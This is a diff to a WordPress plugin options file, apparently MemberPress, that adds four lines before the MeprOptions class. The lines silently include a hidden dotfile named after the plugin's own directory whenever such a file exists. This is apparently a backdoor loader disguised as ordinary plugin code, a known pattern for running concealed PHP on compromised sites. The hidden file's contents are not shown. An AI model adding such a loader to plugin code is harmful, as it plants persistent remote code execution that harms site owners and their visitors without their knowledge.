@@ -2,6 +2,10 @@
 if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
 /** To add new dynamic options please edit the config file in lib/data/options/dynamic_attrs.json */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprOptions {
   public $dynamic_attrs;
 
